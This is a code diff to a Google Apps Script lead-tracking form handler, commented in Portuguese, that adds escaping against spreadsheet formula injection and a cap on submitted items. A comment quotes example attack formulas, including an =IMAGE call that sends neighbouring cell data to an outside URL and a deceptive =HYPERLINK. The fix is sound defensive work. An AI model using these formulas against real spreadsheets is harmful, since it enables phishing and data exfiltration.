@@ -1,6 +1,12 @@
-// BGA Lead Tracker — Google Apps Script  ·  v3 (2026-09-01)
+// BGA Lead Tracker — Google Apps Script  ·  v4 (2026-09-01)
 // Cole em: script.google.com → seu projeto → Code.gs
 // Implantar → Gerenciar implantações → Editar (lápis) → Nova versão → Implantar
+//
+// MUDANÇA DA v4 (auditoria pré-deploy): `clampField` agora neutraliza fórmula.
+// Antes, o texto do visitante ia cru pro `appendRow` e o Sheets o avaliava —
+// injeção de fórmula na planilha que a Aida abre. Vale pros DOIS formulários
+// (home e carrinho), porque os dois passam por aqui. Ver item 34 do
+// docs/BUGS-carrinho-2026-08-29.md. Também entrou um teto de itens no doPost.
 //
 // MUDANÇA DA v3: campo "Ciudad" novo em doGet e doPost — opcional em ambos,
 // nunca entra na guarda de bad_request. Isso deslocou em uma coluna tudo que
@@ -25,6 +31,8 @@
 //   sempre inserida no fim.
 
 var LIMITS = { nombre: 120, empresa: 120, sector: 80, mensaje: 4000 };
+
+var MAX_ITEMS = 200;
 
 var TAB_COTIZACIONES = 'Cotizaciones';
 
@@ -79,6 +87,12 @@ function doPost(e) {
 
   var items = Array.isArray(data.items) ? data.items : [];
   if (!items.length) return jsonOut({ status: 'bad_request' });
+
+  // Teto de itens. O carrinho real não chega perto disto; um POST forjado com
+  // 100 mil linhas chegaria, e o custo cai na cota diária do Apps Script da
+  // conta da BGA — cota estourada = lead real deixa de gravar, em silêncio,
+  // porque o `no-cors` do site esconde a falha.
+  if (items.length > MAX_ITEMS) items = items.slice(0, MAX_ITEMS);
 
   var sheet = abaCotizaciones_();
 
@@ -152,6 +166,15 @@ function autorizado_(chave) {
 function clampField(raw, maxLen) {
   var s = String(raw == null ? '' : raw).trim();
   if (s.length > maxLen) s = s.substring(0, maxLen);
+
+  // Neutraliza fórmula. O Sheets avalia como fórmula qualquer célula cujo texto
+  // comece com = + - @ (ou tab/CR), e tudo que chega aqui é texto digitado por
+  // visitante. Sem isto, =HYPERLINK("https://sitio-falso.py";"Ver cotización")
+  // no campo Nombre vira um link de aparência nativa na planilha que a Aida abre,
+  // e =IMAGE("https://.../x?d="&A2) manda as linhas vizinhas pra fora.
+  // O apóstrofo é o marcador de texto do Sheets: não aparece na célula.
+  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
+
   return s;
 }
 
